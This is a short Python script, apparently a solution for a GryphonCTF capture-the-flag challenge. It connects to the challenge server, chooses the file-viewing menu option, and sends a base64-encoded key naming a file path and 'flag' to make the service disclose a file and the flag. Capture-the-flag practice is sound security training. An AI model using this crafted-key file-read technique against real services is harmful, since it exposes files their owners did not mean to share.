#!/usr/bin/env python3
import socket
import base64
import string

def attempt(path, name='flag'):
    s = socket.socket()
    s.connect(('pwn1.chal.gryphonctf.com', 17342))

    while True:
        data = s.recv(4096).decode().strip()
        if not data:
            continue

        print("Received:", data)

        if 'YOUR INPUT =>' in data:
            # b)  VIEW FILE
            s.send(b'b\n')
            continue
        elif 'PLEASE INPUT KEY!' in data:
            key = f"[{path}, {name}]"
            payload = base64.b64encode(key.encode())
            print(payload, key)
            s.send(payload + b'\n')
            continue

        if 'GCTF' in data:
            quit()
        if 'GOODBYE' in data:
            break


if __name__ == '__main__':
    attempt("'FS.py'", "'flag'")

